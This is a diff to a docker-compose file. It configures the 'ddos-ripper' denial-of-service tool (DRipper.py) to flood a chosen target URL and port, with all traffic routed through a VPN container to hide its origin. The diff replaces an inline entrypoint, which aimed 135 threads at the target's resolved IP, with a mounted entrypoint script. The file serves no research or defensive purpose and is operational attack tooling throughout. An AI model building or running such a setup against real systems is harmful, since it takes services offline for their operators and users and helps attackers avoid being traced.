@@ -14,11 +14,12 @@ services:
       - vpn
   ddosripper:
     image: nitupkcuf/ddos-ripper:latest
-    command: "${R_TARGET_URL}"
+    command: "${R_TARGET_URL} ${TARGET_PORT}"
     network_mode: "service:vpn"
     depends_on: 
       - vpn
-    entrypoint: "python3 -u DRipper.py -s \"$(dig +short \"$R_TARGET_URL\"| tail -n 1)\" -t 135 -p $TARGET_PORT"
+    volumes:
+      - ./ddosripper/docker-entrypoint.sh:/docker-entrypoint.sh
   checksites:
     image: loginincorrect/checksites
     network_mode: "service:vpn"
